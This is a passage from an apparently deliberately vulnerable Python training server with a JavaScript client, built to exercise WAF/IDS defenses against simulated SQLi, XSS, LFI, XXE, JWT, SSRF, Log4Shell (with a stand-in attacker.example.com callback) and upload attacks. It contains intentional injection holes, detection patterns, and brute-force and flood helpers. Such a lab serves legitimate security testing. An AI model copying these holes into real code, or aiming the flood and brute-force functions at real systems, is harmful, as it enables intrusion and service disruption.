        else if(kind==='network_blocked') clientDefenseStats.network_blocked++;
        else if(kind==='timeout') clientDefenseStats.timeout++;
        else if(kind==='aborted') clientDefenseStats.aborted++;
    };
}

function switchTab(name){
  document.querySelectorAll('.section').forEach(function(s){ s.classList.remove('active'); });
  document.querySelectorAll('.tab').forEach(function(t){ t.classList.remove('active'); });
  var s=document.getElementById('sec-'+name);
  if(s) s.classList.add('active');
    var t=document.querySelector('.tab[data-tab="'+name+'"]');
  if(t) t.classList.add('active');
    if(name==='logs') refreshLogsAndStats();
}

function updateTabCounts(){
    document.querySelectorAll('.tab[data-tab]').forEach(function(tab){
        var key=tab.getAttribute('data-tab');
        var label=tab.getAttribute('data-label')||key;
        var section=document.getElementById('sec-'+key);
        var count=0;
        if(section){
            count=section.querySelectorAll('.grid .card').length;
        }
        tab.textContent=label+' ('+count+')';
    });
}

function parseJsonSafe(text){
    try{ return JSON.parse(text); }catch(e){ return null; }
}

function bodyPreview(text){
    if(!text) return '';
    return String(text).replace(/\s+/g,' ').slice(0,220);
}

function toBase64Utf8(s){
    try{ return btoa(unescape(encodeURIComponent(s))); }
    catch(e){ return ''; }
}

function encodeAndTest(){
    var raw=g('deser-plain').trim();
    if(!raw){ show('deser-out','Provide plain SQL payload first.'); return; }
    var b64=toBase64Utf8(raw);
    if(!b64){ show('deser-out','Base64 encode failed in current browser context.'); return; }
    var box=document.getElementById('deser-d');
    if(box) box.value=b64;
    api('deser','deser-out',{payload:b64});
}

function renderApiResult(outId,xhr,jsonObj){
    var lines=['HTTP '+xhr.status];
    if(jsonObj && typeof jsonObj.ok==='boolean'){
        lines.push('App '+(jsonObj.ok?'OK':'Blocked/Failed'));
    }
    if(!jsonObj){
        var ct=(xhr.getResponseHeader('Content-Type')||'').toLowerCase();
        if(xhr.status===0){
            lines.push('Network error: request may be dropped/reset by NGFW/WAF or browser policy.');
        }else if(ct.indexOf('application/json')===-1){
            lines.push('Non-JSON response: possible interception/block page from upstream firewall.');
        }else{
            lines.push('Invalid JSON payload.');
        }
        var sn=bodyPreview(xhr.responseText);
        if(sn) lines.push('Body Preview: '+sn);
        show(outId,lines.join('\\n'));
        return;
    }
    show(outId,lines.join('\\n')+'\\n'+JSON.stringify(jsonObj,null,2));
}

function renderDefensePie(totalRequests,intercepted){
    var pie=document.getElementById('defense-pie');
    var center=document.getElementById('defense-pie-center');
    var legend=document.getElementById('defense-legend');
    var safeTotal=Math.max(0,totalRequests||0);
    var safeIntercept=Math.max(0,Math.min(safeTotal,intercepted||0));
    var pct=safeTotal?((safeIntercept*100.0)/safeTotal):0;
    if(pie) pie.style.setProperty('--pct',pct.toFixed(2));
    if(center) center.textContent=pct.toFixed(1)+'%';
    if(legend) legend.textContent='Total Requests: '+safeTotal+'\\nIntercepted Success: '+safeIntercept+'\\nNot Intercepted: '+(safeTotal-safeIntercept);
}

function api(endpoint,outId,params){
  var qs=Object.keys(params).map(function(k){return encodeURIComponent(k)+'='+encodeURIComponent(params[k]);}).join('&');
  var xhr=new XMLHttpRequest();
    var mark=beginClientTrace();
  xhr.open('GET','/api/'+endpoint+'?'+qs,true);
    xhr.timeout=8000;
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
                if(xhr.status===0) mark('network_blocked');
                else if(xhr.status>=400) mark('http_error');
                else mark('http_ok');
        renderApiResult(outId,xhr,parseJsonSafe(xhr.responseText));
  };
    xhr.onerror=function(){
                mark('network_blocked');
        show(outId,'HTTP 0\\nNetwork error: request blocked/reset before app response.');
    };
    xhr.ontimeout=function(){
                mark('timeout');
        show(outId,'HTTP 0\\nRequest timeout: upstream security device may have dropped this request.');
    };
    xhr.onabort=function(){
                mark('aborted');
        show(outId,'HTTP 0\\nRequest aborted before completion.');
    };
  xhr.send();
}

function reflectedXSS(){
  var p=g('rxss-i');
  var xhr=new XMLHttpRequest();
    var mark=beginClientTrace();
  xhr.open('GET','/api/xss?input='+encodeURIComponent(p),true);
    xhr.timeout=8000;
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
                if(xhr.status===0) mark('network_blocked');
                else if(xhr.status>=400) mark('http_error');
                else mark('http_ok');
        var d=parseJsonSafe(xhr.responseText);
        if(xhr.status===0){
            show('rxss-out','HTTP 0\\nBlocked/reset before app response.');
            return;
        }
        if(!d){
            show('rxss-out','HTTP '+xhr.status+'\\nNon-JSON response, possibly blocked by upstream firewall.');
            return;
        }
        if(d.ok!==true || !d.reflected){
            show('rxss-out','HTTP '+xhr.status+'\\nApp blocked or invalid payload.\\n'+JSON.stringify(d,null,2));
            return;
        }
        showHtml('rxss-out','<span class="warn">Reflected (unsafe innerHTML):</span>\\n'+d.reflected);
  };
        xhr.onerror=function(){ mark('network_blocked'); show('rxss-out','HTTP 0\\nNetwork error: request blocked/reset.'); };
        xhr.ontimeout=function(){ mark('timeout'); show('rxss-out','HTTP 0\\nRequest timeout: likely dropped upstream.'); };
        xhr.onabort=function(){ mark('aborted'); show('rxss-out','HTTP 0\\nRequest aborted.'); };
  xhr.send();
}

function bruteForce(){
  var u=g('bf-u');
  var pws=g('bf-pw').split('\\n').map(function(p){ return p.trim(); }).filter(Boolean);
  var out='Brute forcing "'+u+'" with '+pws.length+' passwords...\\n';
    var done=0,hits=0,blocked=0,errors=0;
    if(!pws.length){ show('bf-out','No passwords provided.'); return; }

    function finishOnce(){
        if(done===pws.length){
            out+='\\nSummary: hits='+hits+', blocked='+blocked+', errors='+errors+', total='+done;
            show('bf-out',out);
        }
    }

  pws.forEach(function(pw){
    var xhr=new XMLHttpRequest();
        var finalized=false;
        function finalize(line,hit){
            if(finalized) return;
            finalized=true;
            if(hit) hits++;
            out+=line+'\\n';
            done++;
            finishOnce();
        }
    xhr.open('GET','/api/sqli?username='+encodeURIComponent(u)+'&password='+encodeURIComponent(pw),true);
        xhr.timeout=6000;
    xhr.onreadystatechange=function(){
      if(xhr.readyState!==4) return;
            var d=parseJsonSafe(xhr.responseText);
            if(xhr.status===0){ blocked++; finalize('[blocked] '+u+':'+pw,false); return; }
            if(!d){ errors++; finalize('[error] '+u+':'+pw+' (non-JSON / intercepted)',false); return; }
            var ok=d.message&&d.message.indexOf('valid')>=0;
            finalize((ok?'[HIT]  ':'[miss] ')+u+':'+pw,ok);
    };
        xhr.onerror=function(){ blocked++; finalize('[blocked] '+u+':'+pw+' (network error)',false); };
        xhr.ontimeout=function(){ blocked++; finalize('[timeout] '+u+':'+pw,false); };
        xhr.onabort=function(){ blocked++; finalize('[aborted] '+u+':'+pw,false); };
    xhr.send();
  });
}

function httpFlood(){
  var ep=g('flood-ep'); var n=parseInt(g('flood-n'),10)||10;
  var out='Sending '+n+' requests to '+ep+'...\\n';
    var done=0,ok=0,httpErr=0,netErr=0,timeouts=0;
  for(var i=0;i<n;i++){
    (function(){
      var xhr=new XMLHttpRequest();
            var finalized=false;
            function finalize(kind){
                if(finalized) return;
                finalized=true;
                if(kind==='ok') ok++;
                else if(kind==='timeout') timeouts++;
                else if(kind==='net') netErr++;
                else httpErr++;
                done++;
                if(done===n){
                    out+='Completed: total='+done+', http200='+ok+', http_error='+httpErr+', network_error='+netErr+', timeout='+timeouts+'\\n';
                    show('flood-out',out);
                }
            }
      xhr.open('GET',ep,true);
            xhr.timeout=6000;
      xhr.onreadystatechange=function(){
        if(xhr.readyState!==4) return;
                if(xhr.status===200) finalize('ok');
                else if(xhr.status===0) finalize('net');
                else finalize('http');
      };
            xhr.onerror=function(){ finalize('net'); };
            xhr.ontimeout=function(){ finalize('timeout'); };
            xhr.onabort=function(){ finalize('net'); };
      xhr.send();
    })();
  }
}

function uploadFile(){
  var input=document.getElementById('upl-f');
  var ext=g('upl-ext');
  if(!input.files||!input.files[0]){ show('upl-out','Select a file first.'); return; }
  var fd=new FormData();
  fd.append('artifact',input.files[0],input.files[0].name+ext);
  var xhr=new XMLHttpRequest();
    var mark=beginClientTrace();
  xhr.open('POST','/api/upload',true);
    xhr.timeout=12000;
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
                if(xhr.status===0) mark('network_blocked');
                else if(xhr.status>=400) mark('http_error');
                else mark('http_ok');
        renderApiResult('upl-out',xhr,parseJsonSafe(xhr.responseText));
  };
        xhr.onerror=function(){ mark('network_blocked'); show('upl-out','HTTP 0\\nNetwork error: upload blocked/reset before app response.'); };
        xhr.ontimeout=function(){ mark('timeout'); show('upl-out','HTTP 0\\nUpload timeout: request may be blocked or dropped upstream.'); };
        xhr.onabort=function(){ mark('aborted'); show('upl-out','HTTP 0\\nUpload aborted before completion.'); };
  xhr.send(fd);
}

function loadDefenseStats(){
    var xhr=new XMLHttpRequest();
    xhr.open('GET','/api/defense-stats',true);
    xhr.onreadystatechange=function(){
        if(xhr.readyState!==4) return;
        var d=parseJsonSafe(xhr.responseText)||{};
        if(!d.app){
            show('defense-out','Failed to load defense stats.');
            return;
        }
        var app=d.app;
        var clientTotal=clientDefenseStats.total||0;
        var preAppBlocked=(clientDefenseStats.network_blocked+clientDefenseStats.timeout+clientDefenseStats.aborted);
        var preAppRate=clientTotal?((preAppBlocked*100.0)/clientTotal).toFixed(2):'0.00';
        var decidedApp=(app.defended+app.vulnerable);
        var compositeDen=(decidedApp+preAppBlocked);
        var compositeRate=compositeDen?(((app.defended+preAppBlocked)*100.0)/compositeDen).toFixed(2):'0.00';
        var byType=d.by_type||{};
        var ranked=Object.keys(byType).map(function(k){
            var it=byType[k]||{};
            var de=(it.defended||0);
            var vu=(it.vulnerable||0);
            var deVu=de+vu;
            var exposure=deVu?((vu*100.0)/deVu):0;
            return {name:k,vulnerable:vu,defended:de,benign:(it.benign||0),unknown:(it.unknown||0),total:(it.total||0),exposure:exposure};
        }).filter(function(x){ return (x.vulnerable+x.defended)>0; })
          .sort(function(a,b){
              if(b.exposure!==a.exposure) return b.exposure-a.exposure;
              return b.vulnerable-a.vulnerable;
          })
          .slice(0,5);
        var lines=[];
        lines.push('Application-side Defense Rate: '+app.defense_rate+'%');
        lines.push('App Decisions (attack-like only): defended='+app.defended+', vulnerable='+app.vulnerable+', unknown='+app.unknown+', attack_events='+app.attack_events+', benign='+app.benign_events+', tracked='+app.tracked_events+', ignored='+app.ignored_events+', parsed_log_events='+app.log_events);
        lines.push('Client Observed Pre-App Blocking (CFW/WAF/Network): '+preAppRate+'%');
        lines.push('Client Requests: total='+clientTotal+', blocked='+clientDefenseStats.network_blocked+', timeout='+clientDefenseStats.timeout+', aborted='+clientDefenseStats.aborted+', http_error='+clientDefenseStats.http_error+', http_ok='+clientDefenseStats.http_ok);
        lines.push('Composite Defense Rate (App Defended + Pre-App Blocked): '+compositeRate+'%');
        if(ranked.length){
            lines.push('Top Risky Types (higher exposure first):');
            ranked.forEach(function(r,idx){
                lines.push((idx+1)+'. '+r.name+' exposure='+r.exposure.toFixed(2)+'% vulnerable='+r.vulnerable+' defended='+r.defended+' benign='+r.benign+' unknown='+r.unknown+' total='+r.total);
            });
        }
        var interceptedSuccess=app.defended+preAppBlocked;
        renderDefensePie(clientTotal,interceptedSuccess);
        show('defense-out',lines.join('\\n'));
    };
    xhr.send();
}

function loadLogs(){
  var xhr=new XMLHttpRequest();
  xhr.open('GET','/api/logs',true);
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
    var d; try{ d=JSON.parse(xhr.responseText); }catch(e){ d={lines:[]}; }
    var b=document.getElementById('log-box');
    if(b) b.textContent=(d.lines||[]).join('\\n')||'No events yet.';
  };
  xhr.send();
}

function refreshLogsAndStats(){
        loadLogs();
        loadDefenseStats();
}

function listLabFiles(){
  var xhr=new XMLHttpRequest();
  xhr.open('GET','/api/lab-files',true);
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
    var d; try{ d=JSON.parse(xhr.responseText); }catch(e){ d={files:[]}; }
    var b=document.getElementById('log-box');
    if(b) b.textContent='Lab Files:\\n'+(d.files||[]).join('\\n');
  };
  xhr.send();
}

function clearLogs(){
  var xhr=new XMLHttpRequest();
  xhr.open('GET','/api/logs/clear',true);
        xhr.onreadystatechange=function(){
                if(xhr.readyState!==4) return;
                clientDefenseStats={total:0,http_ok:0,http_error:0,network_blocked:0,timeout:0,aborted:0};
                                refreshLogsAndStats();
        };
  xhr.send();
}
updateTabCounts();
refreshLogsAndStats();
</script>
</body>
</html>"""


# ---------------------------------------------------------------------------
# HTTP Handler
# ---------------------------------------------------------------------------
class LabHandler(BaseHTTPRequestHandler):

    def _send_json(self, data, code=200):
        b = json.dumps(data).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _send_html(self, text):
        b = text.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _route(self):
        p = urlparse(self.path)
        return p.path, parse_qs(p.query)

    def _qp(self, q, key, default=""):
        return unquote_plus(q.get(key, [default])[0])

    # ------------------------------------------------------------------
    def do_GET(self):
        path, query = self._route()

        # --- Root ---------------------------------------------------------
        if path in ("/", "/index.html"):
            self._send_html(HTML_CONTENT)
            return

        # --- Health -------------------------------------------------------
        if path == "/api/health":
            self._send_json({"ok": True})
            return

        # --- Lab file listing ---------------------------------------------
        if path == "/api/lab-files":
            files = []
            for root, _, names in os.walk(LAB_FILES_DIR):
                for n in names:
                    fp = os.path.join(root, n)
                    files.append(os.path.relpath(fp, LAB_FILES_DIR).replace("\\", "/"))
            self._send_json({"ok": True, "files": sorted(files)})
            return

        # --- Logs ---------------------------------------------------------
        if path == "/api/logs":
            self._send_json({"ok": True, "lines": read_last_log_lines(50)})
            return

        if path == "/api/logs/clear":
            if os.path.isfile(LOG_PATH):
                open(LOG_PATH, "w").close()
            self._send_json({"ok": True, "message": "log cleared"})
            return

        if path == "/api/defense-stats":
            self._send_json(build_defense_stats())
            return

        # --- SQLi (login bypass) ------------------------------------------
        if path == "/api/sqli":
            u = self._qp(query, "username")
            p = self._qp(query, "password")
            sql = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (u, p)
            combined = (u + " " + p).lower()
            bypassed = ("' or '1'='1" in combined or "--" in combined
                        or " or 1=1" in combined)
            union = "union" in combined and "select" in combined
            valid = any(r["username"] == u and r["password"] == p for r in USERS)
            if bypassed or union:
                msg = "auth bypass triggered"
                append_event("sqli", "bypass", sql)
            elif valid:
                msg = "valid credentials"
                append_event("sqli", "ok", sql)
            else:
                msg = "authentication failed"
                append_event("sqli", "failed", sql)
            self._send_json({"ok": True, "query": sql, "bypassed": bypassed,
                             "union_attempt": union, "message": msg})
            return

        # --- SQLi (search / error-based) ----------------------------------
        if path == "/api/sqli2":
            q = self._qp(query, "q")
            sql = "SELECT * FROM products WHERE name LIKE '%%%s%%'" % q
            error_probe = (q.strip().endswith("'") or "--" in q
                           or "extractvalue" in q.lower())
            if error_probe:
                append_event("sqli_error", "probe", q)
                self._send_json({"ok": False, "query": sql,
                                 "error": "SQL syntax error near '%s'" % q[-20:],
                                 "note": "error-based SQLi pattern detected"})
            else:
                append_event("sqli_search", "ok", q)
                self._send_json({"ok": True, "query": sql,
                                 "results": [{"id": 1, "name": "Widget A"},
                                             {"id": 2, "name": "Widget B"}]})
            return

        # --- Command injection -----------------------------------------------
        if path == "/api/cmdi":
            host = self._qp(query, "host")
            cmd  = "ping -c 1 " + host
            dangerous = bool(re.search(r'[;&|$`]', host)) or bool(re.search(r'\s', host.strip()))
            if dangerous:
                append_event("cmdi", "injection", cmd)
                out = ("PING simulated — injection detected.\n"
                       "Constructed: " + cmd + "\n"
                       "Segment 1 (ping): 1 packets transmitted, 1 received\n"
                       "Segment 2 (injected): uid=0(root) gid=0(root) groups=0(root) [simulation]")
            else:
                append_event("cmdi", "safe", cmd)
                out = ("PING %s: 56 data bytes\n"
                       "64 bytes from %s: icmp_seq=0 ttl=64 time=0.1 ms\n"
                       "1 packets transmitted, 1 received, 0%% packet loss" % (host, host))
            self._send_json({"ok": True, "command": cmd, "dangerous": bool(dangerous),
                             "output": out})
            return

        # --- CRLF injection --------------------------------------------------
        if path == "/api/crlfi":
            val  = self._qp(query, "value")
            crlf = ("\r\n" in val or "%0d%0a" in val.lower()
                    or "%0a" in val.lower())
            decoded = (val.replace("%0d%0a", "\r\n")
                       .replace("%0a", "\n")
                       .replace("%0d", "\r"))
            injected = [l for l in decoded.split("\n")[1:] if l.strip()] if crlf else []
            append_event("crlfi", "inject" if crlf else "ok", val)
            self._send_json({"ok": True, "value": val, "crlf_detected": crlf,
                             "injected_headers": injected})
            return

        # --- IDOR (user profile) ---------------------------------------------
        if path == "/api/idor":
            try:
                uid = int(self._qp(query, "id", "1"))
            except ValueError:
                uid = 0
            match = next((u for u in USERS if u["id"] == uid), None)
            append_event("idor", "hit" if match else "miss", "id=%d" % uid)
            if match:
                self._send_json({"ok": True,
                                 "user": {"id": match["id"], "username": match["username"],
                                          "role": match["role"],
                                          "email": "%s@lab.internal" % match["username"]},
                                 "note": "IDOR: no ownership check"})
            else:
                self._send_json({"ok": False, "error": "user not found"}, 404)
            return

        # --- JWT tampering ---------------------------------------------------
        if path == "/api/jwt":
            token  = self._qp(query, "token")
            attack = self._qp(query, "attack", "decode")
            parts  = token.split(".")
            result = {}
            pad = lambda s: s + "=" * (4 - len(s) % 4) if len(s) % 4 else s
            if len(parts) >= 2:
                try:
                    result["header"]  = json.loads(base64.b64decode(pad(parts[0])).decode("utf-8","ignore"))
                    result["payload"] = json.loads(base64.b64decode(pad(parts[1])).decode("utf-8","ignore"))
                except Exception:
                    result["decode_error"] = "could not parse JWT"
            if attack == "none_alg":
                fh = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
                fp = base64.b64encode(json.dumps({"user":"admin","role":"administrator"}).encode()).decode().rstrip("=")
                result["attack"] = "alg:none"
                result["forged_token"] = "%s.%s." % (fh, fp)
                result["note"] = "Signature stripped — server accepting alg:none would treat this as valid"
                append_event("jwt", "alg_none", token[:40])
            elif attack == "weak_secret":
                found = None
                if len(parts) == 3:
                    for s in JWT_WEAK_SECRETS:
                        msg = (parts[0]+"."+parts[1]).encode()
                        expected = base64.urlsafe_b64encode(
                            _hmac.new(s.encode(), msg, hashlib.sha256).digest()
                        ).rstrip(b"=").decode()
                        if expected == parts[2]:
                            found = s
                            break
                result["attack"] = "weak_secret"
                result["cracked_secret"] = found
                result["note"] = ("Secret found: "+found) if found else "No common secret matched"
                append_event("jwt", "weak_secret", str(found))
            else:
                result["attack"] = "decode_only"
                append_event("jwt", "decode", token[:40])
            self._send_json({"ok": True, "result": result})
            return

        # --- XSS (reflected) -------------------------------------------------
        if path == "/api/xss":
            payload = self._qp(query, "input")
            append_event("xss", "reflected", payload[:120])
            self._send_json({"ok": True, "reflected": "You searched for: " + payload})
            return

        # --- XSS via header --------------------------------------------------
        if path == "/api/headerxss":
            val    = self._qp(query, "value")
            custom = self.headers.get("X-Custom-Name", val)
            append_event("xss_header", "reflected", custom[:120])
            self._send_json({"ok": True, "header_value": custom,
                             "reflected": "Hello, " + custom,
                             "note": "Header reflected without escaping"})
            return

        # --- LFI / path traversal -------------------------------------------
        if path == "/api/lfi":
            target = self._qp(query, "target").strip()
            if not target:
                self._send_json({"ok": False, "error": "missing target"}, 400)
                return
            lower = target.replace("\\", "/").replace("%2f","/").replace("%252f","/").lower()
            resolved = None
            if "shadow" in lower:     resolved = "etc/shadow"
            elif "passwd" in lower:   resolved = "etc/passwd"
            elif "id_rsa" in lower:   resolved = "keys/id_rsa"
            elif "tokens.json" in lower: resolved = "app/tokens.json"
            elif "config.yaml" in lower: resolved = "app/config.yaml"
            elif ".env" in lower:     resolved = "app/.env"
            if not resolved:
                append_event("lfi", "miss", target)
                self._send_json({"ok": False, "error": "file not in lab dataset",
                                 "request_target": target}, 404)
                return
            fp = os.path.join(LAB_FILES_DIR, resolved)
            with open(fp, "r") as fh:
                content = fh.read()
            append_event("lfi", "hit", "target=%s resolved=%s" % (target, resolved))
            self._send_json({"ok": True, "request_target": target,
                             "resolved_file": resolved,
                             "vulnerable_path_behavior": True,
                             "content": content})
            return

        # --- Dot-file / backup -----------------------------------------------
        if path == "/api/dotfile":
            f = self._qp(query, "file", ".env")
            if ".env" in f or "env" in f.lower():
                fp = os.path.join(LAB_FILES_DIR, "app/.env")
                try:
                    with open(fp, "r") as fh:
                        content = fh.read()
                    append_event("dotfile", "exposed", f)
                    self._send_json({"ok": True, "file": f, "content": content})
                except IOError:
                    self._send_json({"ok": False, "error": "unavailable"}, 404)
            else:
                content = "# Simulated backup file\npassword=LabBackupPass999\nsecret=backup-secret-fake"
                append_event("dotfile", "exposed", f)
                self._send_json({"ok": True, "file": f, "content": content,
                                 "note": "Backup file exposed"})
            return

        # --- SSRF via redirect -----------------------------------------------
        if path == "/api/ssrf_redirect":
            url      = self._qp(query, "url")
            bypasses = ["0x7f", "127.1", "[::1]", "localhost", "127.0.0.1", "0.0.0.0"]
            bypassed = any(bp in url for bp in bypasses)
            append_event("ssrf_redirect", "bypass" if bypassed else "blocked", url)
            self._send_json({"ok": True, "url": url, "bypassed": bypassed,
                             "response": SSRF_TARGETS.get("127.0.0.1") if bypassed
                             else "redirect blocked by allowlist",
                             "note": "IP bypass detected" if bypassed
                             else "URL checked against allowlist"})
            return

        # --- XXE (file read) -------------------------------------------------
        if path == "/api/xxe":
            xml = self._qp(query, "xml")
            key_map = {"passwd": "passwd", "shadow": "shadow",
                       "env": "env", "id_rsa": "id_rsa"}
            entity_target = None
            m = re.search(r'SYSTEM\s+"([^"]+)"', xml)
            if m:
                raw = m.group(1).split("/")[-1]
                entity_target = key_map.get(raw)
            content = XXE_FILES.get(entity_target, "") if entity_target else ""
            append_event("xxe", "hit" if content else "miss", xml[:80])
            self._send_json({"ok": True, "entity_resolved": entity_target,
                             "content": content or "entity not in lab dataset",
                             "vulnerable": bool(content),
                             "note": "DOCTYPE not sanitized — XXE possible"})
            return

        # --- Base64 SQL injection simulation ---------------------------------
        if path == "/api/deser":
            b64_payload = self._qp(query, "payload") or self._qp(query, "data")
            if not b64_payload:
                self._send_json({"ok": False, "error": "missing base64 payload"}, 400)
                return

            decoded = ""
            try:
                pad = "=" * ((4 - len(b64_payload) % 4) % 4)
                norm = (b64_payload + pad).encode("utf-8", "ignore")
                decoded = base64.b64decode(norm, altchars=b"-_").decode("utf-8", "ignore")
            except Exception:
                decoded = ""

            if not decoded:
                append_event("sqli_b64", "decode_error", b64_payload[:80])
                self._send_json({"ok": False,
                                 "error": "invalid base64 payload",
                                 "payload_b64": b64_payload[:120]}, 400)
                return

            low = decoded.lower()
            union_detected = bool(re.search(r"\bunion\b[\s\S]*\bselect\b", low))
            bypass_detected = ("' or '1'='1" in low or " or 1=1" in low
                               or "--" in low or "#" in low)
            injection = union_detected or bypass_detected
            sql = "SELECT id,name,price FROM products WHERE name LIKE '%%%s%%'" % decoded

            append_event("sqli_b64", "sqli" if injection else "safe", decoded[:120])
            self._send_json({"ok": True,
                             "payload_b64": b64_payload,
                             "decoded_payload": decoded,
                             "query": sql,
                             "union_detected": union_detected,
                             "bypass_detected": bypass_detected,
                             "injection_detected": injection,
                             "note": "UNION/tautology pattern detected in decoded payload"
                             if injection else "Decoded payload does not match common SQLi signatures"})
            return

        # --- Log4Shell -------------------------------------------------------
        if path == "/api/log4shell":
            inp     = self._qp(query, "input")
            is_jndi = bool(re.search(r'\$\{jndi:', inp, re.IGNORECASE))
            obfusc  = "lower:" in inp or "upper:" in inp or "${::-j}" in inp
            append_event("log4shell", "jndi" if is_jndi else "ok", inp[:120])
            self._send_json({"ok": True, "input": inp,
                             "jndi_triggered": is_jndi,
                             "obfuscation": obfusc,
                             "simulated_callback": "ldap://attacker.example.com/a -> RMI class loaded"
                             if is_jndi else None,
                             "note": "CVE-2021-44228 simulation — no real JNDI call"})
            return

        # --- IP spoofing -----------------------------------------------------
        if path == "/api/ip_spoof":
            spoofed  = self._qp(query, "ip")
            endpoint = self._qp(query, "endpoint", "/api/health")
            xff      = self.headers.get("X-Forwarded-For", spoofed)
            trusted  = (spoofed.startswith("10.") or spoofed.startswith("192.168.")
                        or spoofed == "127.0.0.1")
            append_event("ip_spoof", "trusted" if trusted else "rejected",
                         "xff=%s ep=%s" % (xff, endpoint))
            self._send_json({"ok": True, "x_forwarded_for": xff,
                             "real_client": self.client_address[0],
                             "trusted_bypass": trusted,
                             "note": "X-Forwarded-For trusted without validation"
                             if trusted else "IP not in trusted range"})
            return

        # --- Port scan -------------------------------------------------------
        if path == "/api/portscan":
            target    = self._qp(query, "host", "127.0.0.1")
            ports_raw = self._qp(query, "ports", "22,80,443,3306")
            ports = []
            for tok in ports_raw.split(","):
                tok = tok.strip()
                if tok.isdigit():
                    ports.append(int(tok))
            simulated_open = {22, 80, 443, 3306, 6379}
            service_map    = {22:"ssh",80:"http",443:"https",3306:"mysql",
                              6379:"redis",8080:"http-alt",8443:"https-alt"}
            results = [{"port": po,
                        "state": "open" if po in simulated_open else "closed",
                        "service": service_map.get(po, "unknown")}
                       for po in ports]
            append_event("portscan", "scan", "host=%s ports=%s" % (target, ports_raw))
            self._send_json({"ok": True, "target": target, "results": results,
                             "note": "Simulated scan — no real TCP connections"})
            return

        # --- SYN flood -------------------------------------------------------
        if path == "/api/synflood":
            h    = self._qp(query, "host", "127.0.0.1")
            port = self._qp(query, "port", "80")
            cnt  = self._qp(query, "count", "100")
            append_event("synflood", "simulated",
                         "host=%s port=%s count=%s" % (h, port, cnt))
            self._send_json({"ok": True, "attack": "syn_flood_simulation",
                             "target": "%s:%s" % (h, port),
                             "simulated_packets": cnt,
                             "note": "No real packets sent — log generated for WAF/IDS"})
            return

        self.send_error(404, "Not Found")

    # ------------------------------------------------------------------
    def do_POST(self):
        path, _ = self._route()
        if path != "/api/upload":
            self.send_error(404, "Not Found")
            return

        ct = self.headers.get("Content-Type", "")
        if "multipart/form-data" not in ct:
            self._send_json({"ok": False, "error": "multipart/form-data required"}, 400)
            return

        try:
            cl = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            cl = 0

        if cl <= 0 or cl > MAX_UPLOAD_SIZE:
            self._send_json({"ok": False, "error": "invalid size"}, 400)
            return

        body         = self.rfile.read(cl)
        fname, data  = parse_multipart_artifact(body, ct)
        if not fname or data is None:
            self._send_json({"ok": False, "error": "missing artifact field"}, 400)
            return

        stored = datetime.utcnow().strftime("%Y%m%d%H%M%S") + "_" + fname
        spath  = os.path.join(UPLOADS_DIR, stored)
        with open(spath, "wb") as fh:
            fh.write(data)

        sha256    = hashlib.sha256(data).hexdigest()
        text      = data.decode("utf-8", "ignore")
        eicar     = EICAR_TEXT in text
        script_hd = any(text.strip().startswith(m) for m in ["<?php","<%@","<%","<script"])
        risky_ext = os.path.splitext(fname)[1].lower() in (
            ".php",".php5",".phtml",".jsp",".aspx",".sh",".py",".exe")

        upload_status = "stored_attack" if (eicar or risky_ext or script_hd) else "stored_benign"
        append_event("upload", upload_status,
                     "file=%s bytes=%d sha256=%s eicar=%s risky_ext=%s" % (
                         stored, len(data), sha256, eicar, risky_ext))

        self._send_json({"ok": True, "stored_name": stored, "size_bytes": len(data),
                         "sha256": sha256, "eicar_detected": eicar,
                         "risky_extension": risky_ext, "script_header": script_hd,
                         "note": "File stored under ./uploads — not executed"})

    # ------------------------------------------------------------------
    def log_message(self, fmt, *args):
        sys.stdout.write("%s - [%s] %s\n" % (
            self.address_string(),
            self.log_date_time_string(),
            fmt % args))


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    ensure_lab_data()
    append_event("server", "start", "lab initialized — all simulations active")
    server = HTTPServer((HOST, PORT), LabHandler)
    print("Serving security lab on http://0.0.0.0:%d" % PORT)
    print("Lab files : %s" % LAB_FILES_DIR)
    print("Uploads   : %s" % UPLOADS_DIR)
    print("Event log : %s" % LOG_PATH)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        append_event("server", "stop", "shutdown")
        server.server_close()
        print("Server stopped")
